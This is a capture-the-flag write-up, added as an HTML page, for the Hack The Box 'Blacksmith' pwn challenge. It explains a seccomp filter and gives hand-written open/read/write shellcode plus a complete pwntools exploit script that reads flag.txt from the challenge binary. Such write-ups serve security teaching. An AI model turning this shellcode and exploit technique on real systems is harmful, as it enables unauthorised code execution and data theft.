@@ -1,0 +1,152 @@
+<div class="page-header">
+    <div class="page-header-inner">
+        <div class="page-header-inner2">
+            <h1>PWN/Blacksmith - Easy</h1>
+            <h2>August 2021</h2>
+            <h4>Seccomp Bypass Shellcode</h4>
+        </div>
+    </div>
+</div>
+<H4>Problem</H4>
+<div class="paragraph">
+    <p>
+    You are the only one who is capable of saving this town and bringing peace upon this land! You found a blacksmith who can create the most powerful weapon in the world! You can find him under the label "./flag.txt".
+    <br>
+    </p>
+</div>
+<H4>Solution</H4>
+<div class="paragraph">
+    <p>
+    	This challenge gives us a binary to download and develop the exploit for locally, and then an address to connect to remotely and retrieve the flag from using the developed exploit.
+        <br><br>
+    	The binary has NX disabled, so the challenge most likely involves shellcode. We will start by reversing the main function. It starts off by asking us for input, and verifying that this input is equal to '1'. If we pass this check, we are asked for input again, and one of 3 different functions is called depending on the provided input (1,2,3).
+    	<br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/blacksmith1.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Looking at the individual functions, both sword and bow are pretty boring. They just print out a string. The shield function however is a lot more interesting. It reads in 0x3f bytes of input into a stack buffer and then executes this buffer. This means that we can provide the binary shellcode which it will then execute for us. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/blacksmith2.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        Unfortunately the challenge does not make it that easy for us. In the main function we can spot another function that is called before the rest. The sec() function. This function appears to set up various seccomp filters that limit which syscalls we are allowed to use. Anything else will cause the binary to crash. The syscalls we are allowed to use are: 0x0 (read), 0x1 (write), 0x2 (open), and 0x3c (exit). 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/blacksmith3.png" alt="">
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        I initially tried some shellcode I found online, however since only 0x3f bytes are read in, we need a somewhat small shellcode. In the end I decided to write my own shellcode. This shellcode first opens 'flag.txt' using the open syscall, then it reads the flag from it onto the stack using the read syscall, and finally it writes the flag to stdout using the write syscall. <br><br> The shellcode is posted below. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+; Open flag.txt
+xor eax, eax
+mov rbx, 0x7478742e67616c66
+push rax
+push rbx
+mov al, 0x2
+mov rdi, rsp
+xor esi, esi
+syscall
+
+; Read flag.txt content onto stack
+mov rdi, rax
+lea rsi, [rsp]
+xor rdx, rdx
+mov dx, 0xfff
+xor rax, rax
+syscall
+ 
+; Write flag to stdout 
+xor rdi, rdi
+add dil, 1
+mov rdx, rax
+xor rax, rax
+add al, 1
+syscall
+        </code>
+    </pre>
+</div>
+<div class="paragraph">
+    <p>
+        <br><br>
+        This shellcode ended up fitting almost perfectly (1-2 bytes left over), and succeeds in printing out the flag. <br><br>The full exploit is posted below. 
+        <br><br>
+    </p>
+</div>
+<div>
+    <img src="../imgs/hackthebox/blacksmith9.png" alt="">
+</div>
+<div>
+    <style 
+        type="text/css">
+            pre code {
+                      background-color: #008080;
+                      border: 1px solid #999;
+                      display: block;
+                      padding: 15px;
+                      color:  #F5F5DC;
+                    }
+    </style>
+    <pre>
+        <code>
+#!/usr/bin/env python
+
+from pwn import *
+elf = context.binary = ELF('./vuln')
+libc = elf.libc
+
+local = True
+
+if local:
+    p = elf.process()
+else:
+    host = '139.59.166.56'
+    port = 31438
+    p = remote(host,port)
+
+if args.GDB:
+    gdb.attach(p,gdbscript='''
+        b *shield+140
+        continue
+    ''')
+
+sc = b"\x31\xC0\x48\xBB\x66\x6C\x61\x67\x2E\x74\x78\x74\x50\x53\xB0\x02\x48\x89\xE7\x31\xF6\x0F\x05\x48\x89\xC7\x48\x8D\x34\x24\x48\x31\xD2\x66\xBA\xFF\x0F\x48\x31\xC0\x0F\x05\x48\x31\xFF\x40\x80\xC7\x01\x48\x89\xC2\x48\x31\xC0\x04\x01\x0F\x05"
+
+p.sendline('1')
+p.sendline('2')
+p.sendline(sc)
+
+p.interactive()
+        </code>
+    </pre>
+</div>
+<br><br>
+<script>try {pageOpenedDirectly;} catch(e) {var loc = window.location.pathname;var dir = loc.substring(0, loc.lastIndexOf('/'));dir = dir.split("/")[dir.split("/").length-1];let currentLoc = location.href;let currentFile = location.href.split("/").slice(-1);currentLoc = currentLoc.replace(currentFile,"");currentLoc = currentLoc.replace(dir,"");currentLoc = currentLoc.slice(0, -1);if (currentFile[0].indexOf(".html") !== -1) currentFile = currentFile[0].slice(0, -5);window.location = currentLoc+"?p="+currentFile+"&d="+dir;}</script>
